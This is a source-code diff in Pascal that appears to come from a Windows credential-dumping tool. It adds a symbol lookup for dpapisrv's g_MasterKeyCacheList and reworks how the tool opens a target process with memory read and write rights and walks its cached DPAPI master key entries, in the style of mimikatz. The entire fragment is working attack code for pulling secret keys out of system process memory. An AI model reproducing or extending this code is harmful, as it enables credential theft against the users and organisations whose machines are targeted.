@@ -908,6 +908,21 @@ begin
       end;
    end;
 //
+  if symmode=true then
+     begin
+       try
+       if _SymFromName (strpas(sysdir)+'\'+module,'g_MasterKeyCacheList',offset)
+          then
+             begin
+             log('_SymFromName:'+inttohex(offset,sizeof(offset)));
+             patch_pos:=-1;
+             end
+          else log('_SymFromName:failed');
+       except
+       on e:exception do log(e.Message );
+       end;
+     end;
+//
 if patch_pos=0 then
    begin
    log('patch_pos=0');
@@ -921,6 +936,7 @@ if search_module_mem (pid,module,pattern,offset)=false then
    end;
 //
 if offset=0 then exit;
+log('found:'+inttohex(offset,sizeof(pointer)),0);
 //
 hprocess:=thandle(-1);
 hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
@@ -930,9 +946,7 @@ hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATI
        begin
        log('openprocess ok',0);
 
-               log('found:'+inttohex(offset,sizeof(pointer)),0);
-               //
-
+               if patch_pos <>-1 then  //some more work to find the relative offset
                if ReadMem  (hprocess,offset+patch_pos,offset_list) then
                begin
                     CopyMemory(@offset_list_dword,@offset_list[0],4);
@@ -944,6 +958,9 @@ hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATI
                     {$ifdef CPU32}
                     offset:= offset_list_dword{+patch_pos};
                     {$endif CPU32}
+               end; //if readmem
+
+                    //finally do the work
                     //dd dpapisrv!g_MasterKeyCacheList
                     log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
                     //
@@ -977,7 +994,6 @@ hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATI
                     ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
                     log('*****************************************************',1)
                     end;//while
-               end; //if readmem
 
 
        closehandle(hprocess);
@@ -1084,10 +1100,8 @@ result:=false;
      end;
   //
   if offset=0 then exit;
+  log('found:'+inttohex(offset,sizeof(pointer)),0);
   //
-
-    log('found:'+inttohex(offset,sizeof(pointer)),0);
-    //
     hprocess:=thandle(-1);
     hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                         false,pid);
